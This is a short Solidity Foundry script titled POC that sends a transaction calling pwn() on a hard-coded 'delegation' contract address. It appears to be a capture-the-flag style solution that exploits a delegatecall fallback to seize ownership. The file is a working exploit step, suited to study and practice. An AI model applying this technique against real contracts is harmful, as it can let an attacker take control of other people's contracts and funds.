// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "forge-std/console.sol";

// contract delegation address: 0x0dC93eC875Aa2E958aD6520577F259b7647c1c95

contract POC is Script {
    address delegation = 0x0dC93eC875Aa2E958aD6520577F259b7647c1c95;

    function run() public {
        vm.startBroadcast();
        (bool ok, ) = delegation.call(abi.encodeWithSignature("pwn()"));
        require(ok, "tx failed");
        vm.stopBroadcast();
    }
}
